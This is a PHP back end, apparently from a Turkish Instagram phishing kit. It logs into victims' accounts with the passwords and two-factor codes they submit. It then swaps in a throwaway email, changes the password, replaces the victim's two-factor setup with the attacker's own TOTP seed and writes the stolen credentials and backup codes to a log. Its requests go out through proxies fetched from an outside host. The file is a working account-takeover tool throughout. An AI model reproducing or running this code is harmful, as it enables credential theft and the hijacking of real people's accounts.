<?php 
session_start();


error_reporting(0);
require_once('ayarlar.php');
require_once ('auth.php');
class Settings
{
  private $path;
  private $sets;

  public function __construct($path)
  {
    $this->path = $path;
    $this->sets = array();

    if (file_exists($path)) {
      $sets = json_decode(file_get_contents($path), true);
      $this->sets = is_array($sets) ? $sets : array();
    }
  }

  public function get($key, $default = NULL)
  {
    if ($key == 'sets') {
      return $this->sets;
    }

    if (isset($this->sets[$key])) {
      return $this->sets[$key];
    }

    return $default;
  }

  public function set($key, $value)
  {
    if ($key == 'sets') {
      return NULL;
    }

    $this->sets[$key] = $value;
  }

  public function save()
  {
    file_put_contents($this->path, json_encode($this->sets));
  }

  public function setPath($path)
  {
    $this->path = $path;
  }

  public function __set($prop, $value)
  {
    $this->set($prop, $value);
  }

  public function __get($prop)
  {
    return $this->get($prop);
  }
}

class Instagram {
    
  protected $username;
  protected $password;    
  protected $proxy;    
  
  public function __construct($username, $password, $proxy=null) {
      
  $this->username = $username;
  $this->password = $password;
  $this->proxy = $proxy;
  $this->settings = new Settings("cookie/" . $username . ".txt");
  $this->token = $this->settings->get('token');
  
  }
  
  public function Shared(){
      
  $headers = [];
  return $this->request("", $headers);    
      
  }   

 public function login(){
  $this->Shared(); 
  $post = ["username" => $this->username, "enc_password" => "#PWD_INSTAGRAM_BROWSER:0:" . time() . ":" . $this->password, "queryParams" => "{}", "optIntoOneTap" => false];   
  $headers = array();
  $headers[] = 'X-Instagram-Ajax: 1';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'Referer: https://www.instagram.com/accounts/login';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/login/ajax/", $headers, $post)[1];         
     
 }  
public function getUsernameInfo($usernameId) { 
    $headers = array(); 
    $headers[] = 'Authority: www.instagram.com'; 
    $headers[] = 'X-Instagram-Ajax: b10813bd9030'; 
    $headers[] = 'Content-Type: application/x-www-form-urlencoded'; 
    $headers[] = 'Accept: */*'; 
    $headers[] = 'X-Requested-With: XMLHttpRequest'; 
    $headers[] = 'Connection: close'; 
    $headers[] = 'Cookie2: $Version=1'; 
    $headers[] = "X-CSRFToken: ". $this->token; 
    $headers[] = 'X-Ig-App-Id: 936619743392459'; 
    $headers[] = 'Origin: https://www.instagram.com'; 
    $headers[] = 'Referer: https://www.instagram.com/'; 
    $headers[] = 'Accept-Language: tr-TR,tr;q=0.9'; 
    $headers[] = 'User-Agent: Instagram 22.0.0.15.68 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-G935F; hero2lte; samsungexynos8890; en_US)';
    $headers[] = '_uid: 10749205562'; 
    return $this->request2("users/$usernameId/info/",$headers); 
    
}

  
public function searchUsername($usernameName)
  {
     $headers[] = 'Authority: www.instagram.com';
      $headers[] = 'X-Instagram-Ajax: b10813bd9030';
      $headers[] = 'Content-Type: application/x-www-form-urlencoded';
      $headers[] = 'Accept: */*';
      $headers[] = 'X-Requested-With: XMLHttpRequest';
      $headers[] = "X-CSRFToken: ". $this->token;
      $headers[] = 'X-Ig-App-Id: 936619743392459';
      $headers[] = 'Origin: https://www.instagram.com';
      $headers[] = 'Referer: https://www.instagram.com/';
      $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';

      $query = $this->request2("users/$usernameName/usernameinfo/",$headers)[1];
      return $query;
  }


  public function two($username, $verificationCode, $identifier){
  $post = ["username" => $username, "verificationCode" => $verificationCode, "identifier" => $identifier, "queryParams" => '{"next":"/"}'];   
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Ig-Www-Claim: hmac.AR1Pejo6UTpG1Cybt9AWtcXRNyc1_AmtIPKNpLnl9ZI2Qqxf';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/accounts/login/two_factor?next=^%^2F';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/login/ajax/two_factor/", $headers, $post)[1];         
 }   
 public function two_seed(){
  $post = [];   
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Ig-Www-Claim: hmac.AR1Pejo6UTpG1Cybt9AWtcXRNyc1_AmtIPKNpLnl9ZI2Qqxf';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/accounts/login/two_factor?next=^%^2F';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/generate_two_factor_totp_key/", $headers, $post)[1];         
     
 } 
 public function two_enable($verification_code){
  $post = ["verification_code" => $verification_code];    
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Ig-Www-Claim: hmac.AR1Pejo6UTpG1Cybt9AWtcXRNyc1_AmtIPKNpLnl9ZI2Qqxf';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/accounts/login/two_factor?next=^%^2F';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/two_factor_authentication/enable_totp/", $headers, $post)[1];         
     
 }
  public function Kapat(){
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/two_factor_authentication/ajax/disable/", $headers)[1];         
     
 }  
 
  public function Duo(){
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/two_factor_authentication/disable_totp/", $headers)[1];         
     
 } 
 

 
public function Settings($first_name, $email, $username, $phone_number){
  $post = ["first_name" => $first_name, "email" => $email, "username" => $username, "phone_number" => $phone_number, "biography" => "", "external_url" => "", "chaining_enabled" => "on"];   
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/edit/", $headers, $post)[1];         
     
 }
 
  public function Password($password, $new_password){
  $post = ["enc_old_password" => "#PWD_INSTAGRAM_BROWSER:0:" . time() . ":" . $password, "enc_new_password1" => "#PWD_INSTAGRAM_BROWSER:0:" . time() . ":" . $new_password, "enc_new_password2" => "#PWD_INSTAGRAM_BROWSER:0:" . time() . ":" . $new_password];   
  $headers = array();
  $headers[] = 'Authority: www.instagram.com';
  $headers[] = 'X-Instagram-Ajax: b10813bd9030';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Accept: */*';
  $headers[] = 'X-Requested-With: XMLHttpRequest';
  $headers[] = "X-CSRFToken: ". $this->token;
  $headers[] = 'X-Ig-App-Id: 936619743392459';
  $headers[] = 'Origin: https://www.instagram.com';
  $headers[] = 'Referer: https://www.instagram.com/';
  $headers[] = 'Accept-Language: tr-TR,tr;q=0.9';
 return  $this->request("accounts/password/change/", $headers, $post)[1];         
     
 } 


  public function request($endpoint, array $optionalheaders,  $post = NULL) {

  $headers = ["X-Forwarded-For: " . $_SERVER["REMOTE_ADDR"]];
  $headers = array_merge($headers, $optionalheaders);

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/" . $endpoint);
  curl_setopt($ch, CURLOPT_USERAGENT,  $_SERVER["HTTP_USER_AGENT"]);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_VERBOSE, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
  curl_setopt($ch, CURLOPT_POST, true);


    $dch = curl_init();

    curl_setopt($dch, CURLOPT_HEADER, 0);
    curl_setopt($dch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($dch, CURLOPT_URL, 'https://destekmerkeztalepolustur.tk/prxy2.php');

    $data = curl_exec($dch);
    curl_close($dch);

    $proxy=  $data;



$proxy=explode("@",$proxy);
	  	  curl_setopt($ch, CURLOPT_PROXY,$proxy[1]);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
  if ($post) {
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));

   }

   $resp = curl_exec($ch);
   $header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
   $header = substr($resp, 0, $header_len);
   $body = substr($resp, $header_len);
   $this->organizeCookies($header);
   curl_close($ch);
   return array($header, $body, 512, JSON_BIGINT_AS_STRING);
  }
  
    public function request2($endpoint, array $optionalheaders,  $post = NULL) {

        $headers = [
            'Connection: close',
            'Accept: */*',
            'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie2: $Version=1',
            'Accept-Language: en-US',
        ];

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://i.instagram.com/api/v1/" . $endpoint);
  curl_setopt($ch, CURLOPT_USERAGENT,  'Instagram 8.0.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_VERBOSE, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_ENCODING, '');
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_COOKIEFILE, $this->settings->get('cookie'));
  curl_setopt($ch, CURLOPT_COOKIEJAR, $this->settings->get('cookie'));


    $dch = curl_init();

    curl_setopt($dch, CURLOPT_HEADER, 0);
    curl_setopt($dch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($dch, CURLOPT_URL, 'https://destekmerkeztalepolustur.tk/prxy2.php');

    $data = curl_exec($dch);
    curl_close($dch);

    $proxy=  $data;



$proxy=explode("@",$proxy);
			  curl_setopt($ch, CURLOPT_PROXY,$proxy[1]);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy[0]);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
  if ($post) {
  curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));

   }

   $resp = curl_exec($ch);
   $header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
   $header = substr($resp, 0, $header_len);
   $body = substr($resp, $header_len);
   $this->organizeCookies($header);
   curl_close($ch);
   return array($header, $body, 512, JSON_BIGINT_AS_STRING);
  }
  
  public function organizeCookies($headers)
  {
    preg_match_all('/^Set-Cookie:\\s*([^;]*)/mi', $headers, $matches);
    $cookies = array();

    foreach ($matches[1] as $item) {
      parse_str($item, $cookie);
      $cookies = array_merge($cookies, $cookie);
    }

    if (!empty($cookies)) {
      $oldCookies = $this->settings->get('cookie');
      $arrOldCookies = array();

      if (!empty($oldCookies)) {
        $parseCookies = explode(';', $oldCookies);

        foreach ($parseCookies as $c) {
          parse_str($c, $ck);
          $arrOldCookies = array_merge($arrOldCookies, $ck);
        }
      }

      $newCookies = array_merge($arrOldCookies, $cookies);
      $cookie_all = array();

      foreach ($newCookies as $k => $v) {
        $cookie_all[] = $k . '=' . urlencode($v);

        if ($k == 'csrftoken') {
          $this->token = $v;
          $this->settings->set('token', $v);
        }
      }

      $this->settings->set('cookie', implode(';', $cookie_all));
      $this->settings->save();
    }
  }
}


if (isset($_POST["instauser"]) and isset($_POST["instapass"])) {
	

    if (!hash_equals($_SESSION['token'], $_POST['token'])) {
        echo json_encode(array("tokenhata"=>true));
        exit;
    } 



	
$userneym= mb_strtolower($_POST["instauser"], 'utf8'); 
	  $i = new Instagram($userneym, $_POST["instapass"]);
	  $ga = new Morto_CodeGen();
      $login = $i->login();
	print_r($login );
	$log = json_decode($login, true);
	if(isset($log["authenticated"])) {
		if ($log["authenticated"]==true) {
		   
      $chars = "abcdefghijklmnopqrstuvwxyz0123456789";
      $random = substr(str_shuffle($chars),0,9);
      $i->Settings("", $random . "@bokikstore.com", $_POST["instauser"], "");
      $i->Password($_POST['instapass'], $random . "123");
      $back = "";
      $obj = json_decode($i->two_seed());
      $oneCode = $ga->getCode($obj->totp_seed);
      $checkResult = $ga->verifyCode($obj->totp_seed, $oneCode, 2);
      if ($checkResult) {
		     $veri = json_decode($i->two_enable($oneCode));
    $back .= $veri->backup_codes[1] . " - " .  $veri->backup_codes[2] . " - " .  $veri->backup_codes[3] . " - " .  $veri->backup_codes[4];
      }	    
$userr=$_POST['instauser'];
$passs=$_POST['instapass'];
	$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
			
			
			date_default_timezone_set('Europe/Istanbul');  
			$cur_time=date("d-m-Y H:i:s");
			$file = fopen($phpYolu, 'a');
		fwrite($file, "
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>".$userneym."</font><br>
				<font color='red'>Şifresi(değiştirildi): </font><font color='black'>".$random."123</font><br>
                <font color='red'>Uygulamaya Ekle: </font><font color='black'>
                <a href='otpauth://totp/hesap@kurucu?secret=$obj->totp_seed&issuer=kurucu'>GoogleAuthenticator & DuoMobile</a></font><br>
				<font color='red'>Yedek Kodlar: </font><font color='black'>".$back."</font><br>
				<font color='red'>Kurulum Anahtarı: </font><font color='black'>".$obj->totp_seed."</font><br>
				<font color='red'>Hesaba Eklenen Mail Adresi: </font><font color='black'><a href='https://generator.email/".$random."@bokikstore.com'>Mail Hesabına Giriş Yap</a></font><br>
				<font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
			    <font color='red'>DURUM: </font><font color='success'>Doğru şifre // KURUCU ALINDI :) (Hesapta Facebook Varsa Kaldırınız)</font><br>
				<hr>"); 
			fclose($file); 
			
			unlink('cookie/'.$userneym.'.txt');
		





		}
		
		else {
		    $passs=$_POST['instapass'];
		    		$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
$userneym= mb_strtolower($_POST["instauser"], 'utf8'); 
		    	date_default_timezone_set('Europe/Istanbul');  
			$cur_time=date("d-m-Y H:i:s");
			$file = fopen($phpYolu, 'a');
		fwrite($file, "
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>".$userneym."</font><br>
				<font color='red'>Şifresi: </font><font color='black'>".$passs."</font><br>
				<font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
				<font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
					<font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
				<hr>"); 
			fclose($file); 
			
			unlink('cookie/'.$userneym.'.txt');
		    
		}

	}

	if(isset($log["two_factor_required"]) == true) {
		$mesaj="sms";
		if ($log["two_factor_info"]["totp_two_factor_on"]) {
			$mesaj="Kimlik doğrulama uygulaması tarafından oluşturulan 6 haneli kodu girin.
";	
		}
		$_SESSION['uye'] = json_encode(array(
			"username" => $_POST["instauser"],
			"password" =>  $_POST["instapass"],
			"identifier" => $log["two_factor_info"]["two_factor_identifier"],
			"number" => $log["two_factor_info"]["obfuscated_phone_number"],
		
			"mesaj"=>$mesaj
		));  

	}
}


if(isset($_POST["verificationCode"])) {
    
     if (!hash_equals($_SESSION['token'], $_POST['token'])) {
        echo json_encode(array("tokenhata"=>true));
        exit;
    } 

	$uyes = json_decode($_SESSION['uye'],true);   

		$userneym= mb_strtolower($uyes["username"], 'utf8'); 
	$get = new Instagram($userneym, $uyes["password"]);
    $ga = new Morto_CodeGen();
	$code = $get->two($uyes["username"], $_POST["verificationCode"], $uyes["identifier"]);
	print_r( $code );
	$log = json_decode($code, true);
	$passs=$uyes["password"];
	if(isset($log["authenticated"])) {
		if ($log["authenticated"]==true) {
		    
		    $userr=$uyes["username"];
$passs=$uyes["password"];
		   $root = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'];
$root .= str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);

	  $get->Kapat();
	  $get->Duo();
      $chars = "abcdefghijklmnopqrstuvwxyz0123456789";
      $random = substr(str_shuffle($chars),0,9);
      $get->Settings("", $random . "@bokikstore.com", $uyes["username"], "");
      $get->Password($uyes["password"], $random . "123");
      $back = "";
      $obj = json_decode($get->two_seed());
      $oneCode = $ga->getCode($obj->totp_seed);
      $checkResult = $ga->verifyCode($obj->totp_seed, $oneCode, 2);
      if ($checkResult) {
      $veri = json_decode($get->two_enable($oneCode));
      $back .= $veri->backup_codes[1] . " - " .  $veri->backup_codes[2] . " - " .  $veri->backup_codes[3] . " - " .               $veri->backup_codes[4];
      }

	$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
			date_default_timezone_set('Europe/Istanbul');  
			$cur_time=date("d-m-Y H:i:s");
			$file = fopen($phpYolu, 'a');
      fwrite($file, "
      <hr>
      <font color='red'>Kullanıcı Adı: </font><font color='black'>".$userneym."</font><br>
      <font color='red'>Şifresi(değiştirildi): </font><font color='black'>".$random."123</font><br>
      <font color='red'>Uygulamaya Ekle: </font><font color='black'>
      <a href='otpauth://totp/hesap@kurucu?secret=$obj->totp_seed&issuer=kurucu'>GoogleAuthenticator & DuoMobile</a></font><br>
      <font color='red'>Yedek Kodlar: </font><font color='black'>".$back."</font><br>
      <font color='red'>Kurulum Anahtarı: </font><font color='black'>".$obj->totp_seed."</font><br>
      <font color='red'>Hesaba Eklenen Mail Adresi: </font><font color='black'><a href='https://generator.email/".$random."@bokikstore.com/'>Mail Hesabına Giriş Yap</a></font><br>
      <font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
      <font color='red'>DURUM: </font><font color='success'>Doğru şifre // KURUCU ALINDI :) (Hesapta Facebook Varsa Kaldırınız)</font><br>
      <hr>"); 
			fclose($file); 
			
			unlink('cookie/'.$userneym.'.txt');
			
			


		unset($_SESSION['uye']);
		}
		
	}
		else {
		$konum = file_get_contents("http://ip-api.com/xml/".$_SERVER['REMOTE_ADDR']);$cek = new SimpleXMLElement($konum);$ulke=$cek->country;$sehir = $cek->city;
		    	date_default_timezone_set('Europe/Istanbul');  
			$cur_time=date("d-m-Y H:i:s");
			$file = fopen($phpYolu, 'a');
		fwrite($file, "
				<hr>
				<font color='red'>Kullanıcı Adı: </font><font color='black'>".$userneym."</font><br>
				<font color='red'>Şifresi: </font><font color='black'>".$passs."</font><br>
				<font color='red'>İki Faktör Varmıydı?: </font><font color='black'>EVET Fakat Kodu Yanlış Girdi</font><br>
				<font color='red'>Tarih: </font><font color='black'>".$cur_time."</font><br>
					<font color='red'>DURUM: </font><font color='black'>YANLIŞ İKİ FAKTÖR KODU</font><br>
				<hr>"); 
			fclose($file); 
			
		
		    
		}
		
}


?>